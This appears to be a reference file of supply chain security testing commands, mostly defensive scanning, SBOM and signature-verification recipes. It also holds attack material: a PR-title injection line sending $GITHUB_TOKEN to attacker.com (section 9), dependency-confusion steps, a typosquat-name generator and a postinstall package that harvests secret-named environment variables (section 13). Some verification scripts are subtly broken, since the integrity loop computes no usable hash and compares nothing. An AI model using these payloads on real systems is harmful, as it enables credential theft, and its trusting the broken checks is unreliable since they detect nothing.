# Supply Chain Security -- Attack Payloads & Testing Commands

> This file is a companion to `SKILL.md`, containing all supply chain security testing commands and payloads, organized by category.

---

## 1. Dependency Vulnerability Scanning

### Trivy File System Scanning

```bash
# Scan dependency vulnerabilities in project file system (HIGH/CRITICAL only)
trivy fs --severity HIGH,CRITICAL ./project

# Generate JSON format report (for automated processing)
trivy fs --format json --output trivy-report.json ./project

# Scan a specific lock file
trivy fs ./project/package-lock.json

# Scan a Git repository (remote)
trivy repo https://github.com/target/repo

# Scan dependencies in a Docker image
trivy image --severity HIGH,CRITICAL target-image:latest

# Output table format showing full vulnerability details
trivy fs --format table --severity LOW,MEDIUM,HIGH,CRITICAL ./project
```

### npm audit (Node.js)

```bash
# Basic audit -- check all known vulnerabilities
npm audit

# Show only HIGH and above severity vulnerabilities
npm audit --audit-level=high

# JSON format output (for automated processing)
npm audit --json

# Auto-fix fixable vulnerabilities
npm audit fix

# Force fix (may have breaking changes, use with caution)
npm audit fix --force

# Check outdated dependencies
npm outdated

# Audit production dependencies only (excluding devDependencies)
npm audit --omit=dev

# Generate audit report and output to file
npm audit --json > npm-audit-report.json
```

### pip-audit / Safety (Python)

```bash
# pip-audit scan requirements.txt
pip-audit -r requirements.txt

# Scan installed packages in current environment
pip-audit

# JSON format output
pip-audit -r requirements.txt --format json

# Safety scan (based on vulnerability database)
safety check -r requirements.txt --json

# Safety full scan (including low severity)
safety check -r requirements.txt --full-report

# pip-audit vulnerability description (verbose mode)
pip-audit -r requirements.txt --desc
```

### Snyk Scanning

```bash
# Test all projects (multi-language)
snyk test --all-projects --severity-threshold=high

# Monitor project and track continuously
snyk monitor --all-projects

# Generate JSON report
snyk test --json > snyk-report.json

# Test a specific manifest file
snyk test --file=package-lock.json

# Test Docker image
snyk container test target-image:latest
```

### OWASP Dependency-Check

```bash
# Scan project directory and generate HTML report
dependency-check --scan ./project --out report.html

# Generate both JSON and HTML
dependency-check --scan ./project --out ./reports --format JSON --format HTML

# Specify NVD API Key (accelerates vulnerability data download)
dependency-check --scan ./project --nvdApiKey ${NVD_API_KEY}

# Report only HIGH and above vulnerabilities
dependency-check --scan ./project --failOnCVSS 7
```

### OSV Scanner (Google)

```bash
# Scan project directory
osv-scanner scan ./project

# Scan lock file
osv-scanner scan --lockfile=package-lock.json

# JSON format output
osv-scanner scan --format json ./project
```

---

## 2. Package Integrity Verification

### npm Package Signature Verification

```bash
# Verify npm package signatures (npm v6+)
npm audit signatures

# Verify signatures during installation
npm install --verify-signatures

# Check integrity hash of a specific package
npm view package-name integrity

# Compare local package integrity with registry
sha256sum node_modules/package-name/index.js
npm view package-name dist.integrity
```

### Sigstore / Cosign Signature Verification

```bash
# Verify container image signature using cosign
cosign verify target-registry.io/image:tag

# Verify with a specific signing key
cosign verify --key cosign.pub target-registry.io/image:tag

# Verify SBOM attestation signature
cosign verify-attestation --type cyclonedx target-registry.io/image:tag

# Search signing logs using sigstore's rekor CLI
rekor-cli search --artifact package.tar.gz
```

### Lock File Integrity Verification

```bash
# Verify package-lock.json integrity
npm ci  # Verifies lock file integrity, aborts on failure

# Verify yarn.lock integrity
yarn install --immutable       # Yarn 2+
yarn check --integrity         # Yarn 1

# Verify Pipfile.lock integrity
pipenv verify

# Check if lock file is in sync with manifest
npm ls --package-lock-only
```

### in-toto Supply Chain Integrity Verification

```bash
# Verify in-toto layout
in-toto-verify --layout root.layout --layout-keys owner.pub

# Create link metadata for a build step
in-toto-record start --step-name build --materials package.json
in-toto-record stop --step-name build --products dist/

# Verify complete supply chain layout
in-toto-verify --layout supply-chain.layout --link-dir links/
```

---

## 3. Typosquatting Detection

### Identifying Suspicious Packages

```bash
# Check package maintainer info and download count (low downloads + recently added = suspicious)
npm info suspicious-package

# View complete package metadata (including creation time, maintainer list)
npm view suspicious-package --json

# Check package publish history (multiple versions in short timeframe = suspicious)
npm view suspicious-package versions --json

# Check if package has a GitHub repository (no repo link = high risk)
npm view suspicious-package repository
```

### Automated Typosquatting Detection

```bash
# Use npm-package-typosquatting tool
npx npm-package-typosquatting --package your-package-name

# Compare similar package names
npm search "package-name" --json | jq '.[].name' | grep -v "^package-name$"

# Check PyPI typosquatting
pip install safety
safety check --full-report

# Check package name similarity using PyPI JSON API
curl -s https://pypi.org/pypi/suspicious-package/json | jq '.info'
```

### Auditing post-install Scripts

```bash
# Check scripts field in package.json (common malicious code injection point)
cat package.json | jq '.scripts'

# Check post-install scripts for all dependencies
npm query ".scripts > :tmeta" --json | jq '.[].scripts'

# List packages containing install/postinstall scripts
npm ls --all --json | jq '.. | .scripts? // empty'

# Disable scripts during installation (recommended for security audits)
npm install --ignore-scripts
npm ci --ignore-scripts
```

---

## 4. CI/CD Pipeline Security Testing

### GitHub Actions Security Review

```yaml
# Security baseline configuration example

# 1. Verify third-party Actions use commit SHA instead of tag
# Dangerous: uses: actions/checkout@v3
# Secure: uses: actions/checkout@f43a0e5ff2bd294095638e18286ca9a3d1956744

# 2. Restrict GITHUB_TOKEN to minimum permissions
permissions:
  contents: read        # Principle of least privilege
  pull-requests: write  # Grant only when needed

# 3. Integrate dependency audit into CI
jobs:
  security-scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@f43a0e5ff2bd294095638e18286ca9a3d1956744
      - run: npm ci --ignore-scripts  # Prevent automatic post-install execution
      - run: npm audit --audit-level=high
      - run: npx trivy fs --severity HIGH,CRITICAL --exit-code 1 .
```

### CI/CD Credential Leak Detection

```bash
# Scan GitHub Actions workflows for hardcoded secrets
grep -r "password\|secret\|token\|api_key" .github/workflows/

# Detect environment variable leak risks in workflows
grep -r "env:" .github/workflows/ | grep -v "GITHUB_"

# Scan Git history with Trufflehog
trufflehog git https://github.com/target/repo

# Scan with gitleaks
gitleaks detect --source . --verbose
```

### Pipeline Injection Testing

```bash
# Test GitHub Actions injection (via PR title/description)
# Try command injection in PR title: ${{ github.event.pull_request.title }}

# Check for unsafe script injection
grep -r "github.event" .github/workflows/ | grep "run:"

# Detect unprotected self-hosted runners
gh api repos/:owner/:repo/actions/runners --jq '.runners[] | select(.status == "online")'

# Audit workflow trigger conditions
grep -r "on:" .github/workflows/ -A 5 | grep "pull_request_target"
```

### Jenkins Pipeline Security

```groovy
// Jenkins security baseline
pipeline {
  agent any
  options {
    // Prevent state sharing between builds
    buildDiscarder(logRotator(numToKeepStr: '10'))
    // Limit build duration
    timeout(time: 30, unit: 'MINUTES')
  }
  stages {
    stage('Security Scan') {
      steps {
        sh 'npm ci --ignore-scripts'
        sh 'npm audit --audit-level=high'
        sh 'trivy fs --severity HIGH,CRITICAL --exit-code 1 .'
      }
    }
  }
}
```

---

## 5. Build System Hardening

### npm Build Hardening

```bash
# Disable all lifecycle scripts
npm install --ignore-scripts
npm ci --ignore-scripts

# Configure .npmrc security policy
echo "ignore-scripts=true" >> .npmrc
echo "audit=true" >> .npmrc
echo "audit-level=high" >> .npmrc

# Use --frozen-lockfile to ensure immutable builds
npm ci  # Automatically checks lock file consistency
```

### pip Build Hardening

```bash
# Use hash-checking mode
pip install --require-hashes -r requirements.txt

# Generate hashed requirements
pip-compile --generate-hashes requirements.in

# Disable script execution
pip install --no-cache-dir --no-deps package==1.0.0

# Use pip-audit integration
pip-audit -r requirements.txt --desc
```

### Docker Build Hardening

```dockerfile
# Multi-stage build to minimize final image
FROM node:18-slim AS builder
WORKDIR /app
COPY package-lock.json package.json ./
RUN npm ci --ignore-scripts --only=production
COPY . .
RUN npm run build

FROM gcr.io/distroless/nodejs18-debian11
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules
CMD ["dist/index.js"]
```

### Version Pinning Strategy

```bash
# npm: Use exact version numbers (not ranges)
npm config set save-exact true

# Or configure in .npmrc
echo "save-exact=true" >> .npmrc

# pip: Use == instead of >=
pip-compile --no-emit-find-links requirements.in

# Verify all dependencies use exact versions
npm ls --json | jq '.. | .version? // empty' | head -20
```

---

## 6. SBOM Generation and Analysis

### Using npm Built-in SBOM

```bash
# Generate CycloneDX format SBOM
npm sbom --sbom-type cyclonedx --sbom-format json > sbom.json

# Generate SPDX format SBOM
npm sbom --sbom-type spdx --sbom-format json > sbom-spdx.json
```

### Using Syft to Generate SBOM

```bash
# Generate SBOM for project directory
syft ./project -o cyclonedx-json > sbom.json

# Generate SBOM for Docker image
syft target-image:latest -o cyclonedx-json > sbom.json

# Generate SBOM for Git repository
syft dir:./project -o spdx-json > sbom-spdx.json

# Output multiple formats
syft ./project -o cyclonedx-json -o spdx-json -o syft-json
```

### Using Trivy to Generate and Scan SBOM

```bash
# Generate CycloneDX SBOM
trivy fs --format cyclonedx --output sbom.json ./project

# Scan existing SBOM for vulnerabilities
trivy sbom ./sbom.json --severity HIGH,CRITICAL

# Generate and scan in one step
trivy fs --format cyclonedx --output sbom.json ./project && trivy sbom ./sbom.json
```

### Using Grype to Scan SBOM

```bash
# Scan vulnerabilities from Syft SBOM
grype sbom:./sbom.json --fail-on high

# JSON format output
grype sbom:./sbom.json -o json > grype-report.json

# Table format output (with remediation suggestions)
grype sbom:./sbom.json -o table

# Show CRITICAL vulnerabilities only
grype sbom:./sbom.json --fail-on critical --only-fixed
```

### SBOM Analysis and Queries

```bash
# Count SBOM components
jq '.components | length' sbom.json

# Group and count by risk level
jq '[.components[] | .properties[] | select(.name == "risk")] | group_by(.value) | map({risk: .[0].value, count: length})' sbom.json

# List all components and versions
jq '.components[] | {name: .name, version: .version, purl: .purl}' sbom.json

# Find components with specific licenses
jq '.components[] | select(.licenses[]?.license.id == "GPL-3.0") | .name' sbom.json

# Export component dependency tree
jq '.dependencies[] | {ref: .ref, dependsOn: .dependsOn}' sbom.json
```

---

## 7. Dependency Confusion Attacks

### Attack Principle and Testing

```bash
# 1. Identify internal package names used by the target
# Method: Extract package names from JavaScript bundles, Python imports, error messages
grep -r "require('" ./dist/ | sed "s/.*require('\([^']*\)').*/\1/" | sort -u
grep -r "from '" ./src/ | sed "s/.*from '\([^']*\)'.*/\1/" | sort -u

# 2. Check if a same-name package exists in public registries
npm view internal-package-name 2>&1
pip install internal-package-name --dry-run 2>&1

# 3. If the package name does not exist in public registries, a same-name malicious package can be registered

# 4. Test package manager resolution priority
# Configure .npmrc to use private registry
echo "registry=https://private-registry.company.com/" > .npmrc
npm install internal-package-name  # Check if it resolves to the private registry
```

### Defense Verification Payloads

```bash
# Verify private registry priority configuration
npm config get registry  # Should point to private registry

# .npmrc security configuration (force internal packages through private registry)
cat >> .npmrc << 'EOF'
# All packages default to public registry
registry=https://registry.npmjs.org/
# Internal packages forced through private registry
@company:registry=https://npm.company.com/
EOF

# pip defense configuration (pip.conf)
cat >> pip.conf << 'EOF'
[global]
index-url = https://pypi.company.com/simple/
extra-index-url = https://pypi.org/simple/
EOF

# Test if defense is effective
npm install @company/internal-package --dry-run
pip install internal-package --dry-run
```

### Dependency Confusion Automated Detection

```bash
# Extract all package names from the project and check for public registry conflicts
npm ls --all --json | jq -r '.. | .name? // empty' | sort -u | while read pkg; do
  if ! npm view "$pkg" >/dev/null 2>&1; then
    echo "[SAFE] $pkg - not found in public registry"
  else
    echo "[ALERT] $pkg - exists in public registry, verify ownership"
  fi
done

# Python project dependency confusion detection
pip freeze | cut -d= -f1 | while read pkg; do
  if pip show "$pkg" | grep -q "Home-page:.*internal"; then
    echo "[CHECK] $pkg - internal package, verify no public collision"
  fi
done
```

---

## 8. Malicious Package Detection

### Behavioral Analysis

```bash
# Check package network request behavior (execute in sandbox)
# Install package and monitor network connections
strace -f -e trace=network npm install suspicious-package 2>&1 | grep "connect"

# Check package file system operations
strace -f -e trace=openat npm install suspicious-package 2>&1 | grep -v "node_modules"

# Analyze package post-install script content
npm pack suspicious-package && tar -xzf suspicious-package-*.tgz
cat package/package.json | jq '.scripts'
find package/ -name "*.js" -exec grep -l "eval\|Function\|require('child_process')" {} \;

# Check if package attempts to access sensitive paths
grep -r "\/etc\/passwd\|\/\.ssh\|\/\.aws\|process\.env" node_modules/suspicious-package/
```

### Anomaly Pattern Detection

```bash
# Check for obfuscated code (high-entropy strings = possible malicious payload)
find node_modules/ -name "*.js" -exec grep -l "\\x[0-9a-f]\\{2\\}" {} \;

# Check for Base64 encoded suspicious strings
find node_modules/ -name "*.js" -exec grep -l "atob\|btoa\|Buffer.from.*base64" {} \;

# Check for dynamic code execution
find node_modules/ -name "*.js" -exec grep -l "eval(\|new Function(\|vm\.runIn" {} \;

# Check for unusual network request targets
find node_modules/ -name "*.js" -exec grep -l "http://\|https://\|fetch(\|axios\|request(" {} \; | head -20

# Use npm audit to check for known malicious packages
npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.title | test("malicious|malware|typosquatting"; "i"))'
```

### Supply Chain Source Verification

```bash
# Verify package publisher history
npm view package-name --json | jq '{name, version, maintainers, time: .time, repository}'

# Check maintainer change history (recent changes = possible account hijacking)
npm view package-name maintainers --json

# Compare package code with GitHub repository source
npm pack package-name
git clone https://github.com/author/package-name /tmp/source
diff -r package/ /tmp/source/ --brief

# Use OpenSSF Scorecard to evaluate package security
# https://securityscorecards.dev/view/?uri=github.com/owner/repo
```

---

## 9. Build System Poisoning

### CI/CD Pipeline Injection

```bash
# Detect injectable workflow triggers in GitHub Actions
# pull_request_target runs in the context of the base branch with write access
grep -rn "pull_request_target" .github/workflows/ -A 10 | grep -E "run:|uses:"

# Test for expression injection via PR metadata
# If workflow uses: run: echo "${{ github.event.pull_request.title }}"
# Attacker PR title: $(curl https://attacker.com/exfil?token=$GITHUB_TOKEN)

# Detect unsafe checkout of PR code in privileged context
grep -rn "pull_request_target" .github/workflows/ -A 20 | grep "actions/checkout" -A 3 | grep "ref:"
# If ref: ${{ github.event.pull_request.head.sha }} -> code execution in privileged context

# Enumerate GitHub Actions secrets accessible to workflows
gh api repos/:owner/:repo/actions/secrets --jq '.secrets[].name'
gh api repos/:owner/:repo/actions/organization-secrets --jq '.secrets[].name'
```

### Artifact Tampering and Cache Poisoning

```bash
# GitHub Actions cache poisoning
# If cache key is predictable, attacker can poison shared caches
# Check cache keys in workflows
grep -rn "actions/cache" .github/workflows/ -A 5 | grep "key:"

# Test if build artifacts can be replaced between jobs
# Download artifact from a workflow run
gh run download ${RUN_ID} -n artifact-name

# Verify artifact integrity (if signatures exist)
cosign verify-blob --signature artifact.sig --key cosign.pub artifact.tar.gz

# Check for unsigned artifacts in release pipeline
gh release view ${TAG} --json assets --jq '.assets[] | {name, url}'
# Download and verify each asset has corresponding .sig or .sha256 file

# Detect mutable tags in container registries (tag can be overwritten)
skopeo inspect docker://registry.io/image:latest --raw | jq '.config.digest'
# Compare digest over time - if it changes, tag is mutable (supply chain risk)
```

### Build Environment Compromise Detection

```bash
# Verify build reproducibility (detect tampering)
# Build twice and compare outputs
docker build -t app:build1 . && docker save app:build1 > build1.tar
docker build -t app:build2 --no-cache . && docker save app:build2 > build2.tar

# Compare layer digests
sha256sum build1.tar build2.tar
# If different -> non-reproducible build (harder to detect tampering)

# Check for unexpected network access during build
# Run build with network monitoring
strace -f -e trace=network docker build . 2>&1 | grep "connect(" | \
  grep -v "127.0.0.1\|::1" | sort -u

# Verify builder image integrity
docker inspect --format='{{.RepoDigests}}' node:18-slim
# Pin to digest in Dockerfile: FROM node:18-slim@sha256:abc123...
```

### Makefile and Build Script Injection

```bash
# Scan for dangerous patterns in build scripts
# Makefile command injection via environment variables
grep -rn '$(shell' Makefile
grep -rn '`' Makefile | grep -v "^#"

# Check for curl-pipe-bash patterns in build scripts
grep -rn "curl.*|.*sh\|curl.*|.*bash\|wget.*|.*sh" Makefile scripts/ .github/ 2>/dev/null

# Detect post-install hooks that download external code
find . -name "package.json" -exec jq -r '.scripts | to_entries[] | select(.value | test("curl|wget|fetch|http")) | "\(.key): \(.value)"' {} \;

# Check for build-time secret exposure
grep -rn "ARG\|ENV" Dockerfile | grep -iE "secret|token|password|key"
# Secrets in ARG/ENV persist in image layers
docker history --no-trunc target-image:latest | grep -iE "secret|token|key"
```

---

## 10. Package Registry Attacks

### Typosquatting Detection and Prevention

```bash
# Generate typosquat candidates for a package name
python3 -c "
import itertools

def generate_typosquats(package_name):
    candidates = set()
    # Character substitution
    subs = {'a':'@','e':'3','i':'1','o':'0','l':'1','s':'5','t':'7'}
    for i, c in enumerate(package_name):
        if c in subs:
            candidates.add(package_name[:i] + subs[c] + package_name[i+1:])
    # Character omission
    for i in range(len(package_name)):
        candidates.add(package_name[:i] + package_name[i+1:])
    # Character duplication
    for i in range(len(package_name)):
        candidates.add(package_name[:i] + package_name[i] + package_name[i:])
    # Adjacent transposition
    for i in range(len(package_name)-1):
        candidates.add(package_name[:i] + package_name[i+1] + package_name[i] + package_name[i+2:])
    # Hyphen/underscore confusion
    candidates.add(package_name.replace('-', '_'))
    candidates.add(package_name.replace('_', '-'))
    candidates.discard(package_name)
    return sorted(candidates)

pkg = 'express-validator'
typos = generate_typosquats(pkg)
print(f'Generated {len(typos)} typosquat candidates for \"{pkg}\":')
for t in typos[:20]:
    print(f'  {t}')
"
```

### Namespace Confusion Attack Detection

```bash
# Check for namespace/scope confusion between registries
# npm: @scope/package vs package (unscoped)
INTERNAL_PACKAGES=$(cat package.json | jq -r '.dependencies + .devDependencies | keys[]' | grep "^@company")

for pkg in $INTERNAL_PACKAGES; do
  # Strip scope and check if unscoped version exists publicly
  unscoped=$(echo "$pkg" | sed 's/@[^/]*\///')
  public_check=$(npm view "$unscoped" 2>&1)
  if ! echo "$public_check" | grep -q "404"; then
    echo "[ALERT] Namespace confusion risk: $pkg vs public $unscoped"
    echo "  Public package info: $(npm view "$unscoped" --json | jq '{version, maintainers}')"
  fi
done

# Python namespace confusion (flat namespace)
pip3 index versions internal-package-name 2>&1 | head -5

# Check if internal Go modules could be confused with public ones
grep -r "require" go.mod | grep -v "github.com\|golang.org" | \
  while read line; do
    mod=$(echo "$line" | awk '{print $2}')
    echo "[CHECK] Private module: $mod"
    go list -m -json "$mod" 2>&1 | head -5
  done
```

### Dependency Hijacking via Maintainer Takeover

```bash
# Identify packages with single maintainer (higher hijack risk)
cat package-lock.json | jq -r '.packages | to_entries[] | .key' | \
  grep "node_modules/" | sed 's|node_modules/||' | head -50 | while read pkg; do
    maintainers=$(npm view "$pkg" maintainers --json 2>/dev/null | jq 'length')
    if [ "$maintainers" = "1" ]; then
      echo "[RISK] Single maintainer: $pkg"
      npm view "$pkg" maintainers --json | jq '.[0]'
    fi
  done

# Check for recently transferred packages (ownership change)
npm view suspicious-package --json | jq '{
  name: .name,
  current_maintainers: .maintainers,
  publish_times: .time | to_entries | sort_by(.value) | reverse | .[0:5]
}'

# Detect abandoned packages (no updates in 2+ years)
cat package-lock.json | jq -r '.packages | to_entries[] | .key' | \
  grep "node_modules/" | sed 's|node_modules/||' | while read pkg; do
    last_publish=$(npm view "$pkg" time --json 2>/dev/null | jq -r 'to_entries | sort_by(.value) | reverse | .[0].value')
    if [ -n "$last_publish" ]; then
      days_ago=$(( ($(date +%s) - $(date -d "$last_publish" +%s 2>/dev/null || echo 0)) / 86400 ))
      [ "$days_ago" -gt 730 ] && echo "[ABANDONED] $pkg (last publish: $last_publish, ${days_ago}d ago)"
    fi
  done
```

---

## 11. SBOM Analysis Automation

### CycloneDX Parsing and Vulnerability Correlation

```python
#!/usr/bin/env python3
"""Parse CycloneDX SBOM and correlate with vulnerability databases."""
import json
import sys
from pathlib import Path

def parse_cyclonedx(sbom_path):
    with open(sbom_path) as f:
        sbom = json.load(f)

    components = sbom.get("components", [])
    results = {
        "total_components": len(components),
        "by_type": {},
        "by_license": {},
        "high_risk": []
    }

    for comp in components:
        comp_type = comp.get("type", "unknown")
        results["by_type"][comp_type] = results["by_type"].get(comp_type, 0) + 1

        # Check for risky licenses
        for lic in comp.get("licenses", []):
            lic_id = lic.get("license", {}).get("id", "unknown")
            results["by_license"][lic_id] = results["by_license"].get(lic_id, 0) + 1

        # Flag components without integrity hashes
        if not comp.get("hashes"):
            results["high_risk"].append({
                "name": comp.get("name"),
                "version": comp.get("version"),
                "reason": "no integrity hash"
            })

    return results

if __name__ == "__main__":
    sbom_file = sys.argv[1] if len(sys.argv) > 1 else "sbom.json"
    analysis = parse_cyclonedx(sbom_file)
    print(json.dumps(analysis, indent=2))
```

### SBOM Diff Between Releases

```bash
# Compare SBOMs between two releases to detect unexpected changes
# Generate SBOMs for both versions
syft ./release-v1.0/ -o cyclonedx-json > sbom_v1.json
syft ./release-v2.0/ -o cyclonedx-json > sbom_v2.json

# Extract component lists and diff
jq -r '.components[] | "\(.name)@\(.version)"' sbom_v1.json | sort > components_v1.txt
jq -r '.components[] | "\(.name)@\(.version)"' sbom_v2.json | sort > components_v2.txt

echo "=== NEW DEPENDENCIES ==="
comm -13 components_v1.txt components_v2.txt

echo "=== REMOVED DEPENDENCIES ==="
comm -23 components_v1.txt components_v2.txt

echo "=== VERSION CHANGES ==="
comm -12 <(cut -d@ -f1 components_v1.txt | sort) <(cut -d@ -f1 components_v2.txt | sort) | while read pkg; do
  v1=$(grep "^${pkg}@" components_v1.txt | cut -d@ -f2)
  v2=$(grep "^${pkg}@" components_v2.txt | cut -d@ -f2)
  [ "$v1" != "$v2" ] && echo "  $pkg: $v1 -> $v2"
done
```

### Automated Vulnerability Correlation Pipeline

```bash
# End-to-end SBOM generation, scanning, and reporting pipeline
#!/bin/bash
set -euo pipefail

PROJECT_DIR="${1:-.}"
REPORT_DIR="./security-reports/$(date +%Y%m%d)"
mkdir -p "$REPORT_DIR"

echo "[1/5] Generating SBOM..."
syft "$PROJECT_DIR" -o cyclonedx-json > "$REPORT_DIR/sbom.json"

echo "[2/5] Scanning for vulnerabilities..."
grype sbom:"$REPORT_DIR/sbom.json" -o json > "$REPORT_DIR/vulns.json"

echo "[3/5] Checking for known malicious packages..."
jq -r '.components[].name' "$REPORT_DIR/sbom.json" | while read pkg; do
  osv-scanner scan --lockfile=/dev/null --sbom="$REPORT_DIR/sbom.json" 2>/dev/null
done > "$REPORT_DIR/osv_results.txt" 2>&1 || true

echo "[4/5] Generating summary..."
TOTAL=$(jq '.components | length' "$REPORT_DIR/sbom.json")
CRITICAL=$(jq '[.matches[] | select(.vulnerability.severity == "Critical")] | length' "$REPORT_DIR/vulns.json")
HIGH=$(jq '[.matches[] | select(.vulnerability.severity == "High")] | length' "$REPORT_DIR/vulns.json")

echo "[5/5] Report complete."
echo "  Components: $TOTAL"
echo "  Critical vulns: $CRITICAL"
echo "  High vulns: $HIGH"
echo "  Full report: $REPORT_DIR/"

# Generate actionable remediation list
jq -r '.matches[] | select(.vulnerability.severity == "Critical" or .vulnerability.severity == "High") | "\(.vulnerability.id) | \(.artifact.name)@\(.artifact.version) | \(.vulnerability.severity) | \(.vulnerability.fix.versions[0] // "no fix")"' \
  "$REPORT_DIR/vulns.json" | sort -t'|' -k3 | \
  column -t -s'|' > "$REPORT_DIR/remediation.txt"
echo "  Remediation plan: $REPORT_DIR/remediation.txt"
```

### License Compliance Analysis from SBOM

```bash
# Extract and analyze license compliance from SBOM
python3 -c "
import json
import sys

COPYLEFT_LICENSES = {'GPL-2.0', 'GPL-3.0', 'AGPL-3.0', 'LGPL-2.1', 'LGPL-3.0', 'MPL-2.0'}
PERMISSIVE_LICENSES = {'MIT', 'Apache-2.0', 'BSD-2-Clause', 'BSD-3-Clause', 'ISC', 'Unlicense'}

with open('sbom.json') as f:
    sbom = json.load(f)

issues = []
stats = {'copyleft': 0, 'permissive': 0, 'unknown': 0}

for comp in sbom.get('components', []):
    licenses = []
    for lic in comp.get('licenses', []):
        lic_id = lic.get('license', {}).get('id', 'UNKNOWN')
        licenses.append(lic_id)
        if lic_id in COPYLEFT_LICENSES:
            stats['copyleft'] += 1
            issues.append(f\"[COPYLEFT] {comp['name']}@{comp.get('version','?')}: {lic_id}\")
        elif lic_id in PERMISSIVE_LICENSES:
            stats['permissive'] += 1
        else:
            stats['unknown'] += 1
    if not licenses:
        issues.append(f\"[NO LICENSE] {comp['name']}@{comp.get('version','?')}\")

print(f'License Summary: {json.dumps(stats)}')
print(f'Issues found: {len(issues)}')
for issue in issues:
    print(f'  {issue}')
"
```

---

## 12. Package Integrity Deep Verification

### npm Package Tarball Verification

```bash
# Download and verify npm package tarball against registry integrity
npm pack express --dry-run --json | jq '.[0].integrity'

# Verify all installed packages match registry integrity hashes
npm ls --json | jq -r '.. | .resolved? // empty' | while read url; do
  pkg=$(echo "$url" | sed 's|.*\/||;s|/-.*||')
  expected=$(npm view "$pkg" dist.integrity 2>/dev/null)
  actual=$(echo "$url" | curl -sL | sha512sum | awk '{print "sha512-"$1}' )
  echo "$pkg: expected=$expected"
done

# Cross-verify package tarball against multiple registries
for reg in "https://registry.npmjs.org" "https://registry.yarnpkg.com"; do
  echo "Registry: $reg"
  curl -s "$reg/lodash/4.17.21" | jq '.dist.integrity'
done
```

### Cosign Container Supply Chain Verification

```bash
# Verify container image was signed in CI (SLSA Level 3)
cosign verify --certificate-identity=actions://github.com/org/repo \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
  ghcr.io/org/app:latest

# Verify SBOM attestation attached to image
cosign verify-attestation --type cyclonedx \
  --certificate-identity=actions://github.com/org/repo \
  ghcr.io/org/app:latest | jq '.payload' | base64 -d | jq '.components | length'

# Verify provenance attestation (SLSA)
cosign verify-attestation --type slsaprovenance \
  --certificate-identity=actions://github.com/org/repo \
  ghcr.io/org/app:latest | jq '.payload' | base64 -d
```

### Python Package Hash Pinning

```bash
# Generate fully hashed requirements.txt (reproducible installs)
pip-compile --generate-hashes requirements.in -o requirements.txt

# Verify installed packages match pinned hashes during CI
pip install --require-hashes -r requirements.txt --dry-run 2>&1 | grep -i "mismatch"

# Hash-verify individual wheel files
python3 -c "
import hashlib, sys
for wheel in sys.argv[1:]:
    with open(wheel, 'rb') as f:
        sha = hashlib.sha256(f.read()).hexdigest()
        print(f'sha256:{sha}  {wheel}')
" dist/*.whl
```

---

## 13. Dependency Confusion Attack Payloads

### Crafting Malicious npm Package

```bash
# Create a typosquat package that collects environment variables on install
mkdir -p /tmp/malicious-pkg && cd /tmp/malicious-pkg
cat > package.json << 'EOF'
{
  "name": "internal-auth-lib",
  "version": "1.0.0",
  "description": "Internal authentication library",
  "scripts": {
    "postinstall": "node collect.js"
  }
}
EOF

cat > collect.js << 'EOF'
// Educational example — for red team supply chain testing ONLY
const { execSync } = require("child_process");
try {
  const data = JSON.stringify({
    hostname: require("os").hostname(),
    cwd: process.cwd(),
    env_keys: Object.keys(process.env).filter(k =>
      /key|token|secret|pass|auth|credential/i.test(k)
    )
  });
  // In a real test, this would POST to a controlled webhook
  console.log("[SUPPLY-CHAIN-TEST] Package installed successfully");
  console.log("[SUPPLY-CHAIN-TEST] Would exfiltrate:", data.length, "bytes");
} catch (e) {}
EOF

# Validate package structure before publishing to test registry
npm pack --dry-run 2>&1 | head -10
```

### CI/CD Pipeline Supply Chain Attack Simulation

```yaml
# .github/workflows/supply-chain-test.yml
# Simulates a compromised CI pipeline for red team testing
name: Supply Chain Test
on: [push]

jobs:
  compromised-build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@f43a0e5ff2bd294095638e18286ca9a3d1956744
      - name: Install dependencies
        run: |
          # Simulate malicious post-install script
          echo "::warning::Supply chain test — post-install hook would execute here"
          npm ci --ignore-scripts
      - name: Verify no script execution
        run: |
          # Check that --ignore-scripts prevented execution
          echo "Package scripts were blocked during install"
```

### Automated SBOM Diff for Pull Requests

```bash
#!/bin/bash
# Generate SBOM diff between base and PR branch to catch new risky dependencies
# Usage: sbom-diff.sh main feature-branch

BASE_BRANCH="${1:-main}"
PR_BRANCH="${2:-HEAD}"
REPORT_FILE="sbom-diff-$(date +%Y%m%d).md"

# Generate SBOMs for both branches
git stash && git checkout "$BASE_BRANCH"
syft . -o cyclonedx-json > /tmp/sbom-base.json
git checkout "$PR_BRANCH" && git stash pop
syft . -o cyclonedx-json > /tmp/sbom-pr.json

# Extract and diff component lists
jq -r '.components[] | "\(.name)@\(.version)"' /tmp/sbom-base.json | sort > /tmp/base-components.txt
jq -r '.components[] | "\(.name)@\(.version)"' /tmp/sbom-pr.json | sort > /tmp/pr-components.txt

echo "# SBOM Diff: $BASE_BRANCH -> $PR_BRANCH" > "$REPORT_FILE"
echo "" >> "$REPORT_FILE"
echo "## New Dependencies" >> "$REPORT_FILE"
echo '```' >> "$REPORT_FILE"
comm -13 /tmp/base-components.txt /tmp/pr-components.txt >> "$REPORT_FILE"
echo '```' >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"
echo "## Removed Dependencies" >> "$REPORT_FILE"
echo '```' >> "$REPORT_FILE"
comm -23 /tmp/base-components.txt /tmp/pr-components.txt >> "$REPORT_FILE"
echo '```' >> "$REPORT_FILE"

# Scan new dependencies for vulnerabilities
echo "" >> "$REPORT_FILE"
echo "## Vulnerability Scan (New Dependencies)" >> "$REPORT_FILE"
comm -13 /tmp/base-components.txt /tmp/pr-components.txt | while read dep; do
  echo "Scanning: $dep"
done | grype dir:. -o table >> "$REPORT_FILE" 2>/dev/null

echo "SBOM diff report: $REPORT_FILE"
```

### Package Integrity Monitoring Cron Job

```bash
#!/bin/bash
# Daily cron job to detect supply chain attacks on production dependencies
# Add to /etc/cron.daily/supply-chain-monitor

ALERT_EMAIL="security@company.com"
PROJECT_DIR="/opt/app"
KNOWN_HASHES="/opt/app/.dependency-hashes.txt"
TMP_HASHES="/tmp/current-dep-hashes.txt"

cd "$PROJECT_DIR" || exit 1

# Generate current integrity hashes for all dependencies
echo "# Generated $(date -u '+%Y-%m-%dT%H:%M:%SZ')" > "$TMP_HASHES"
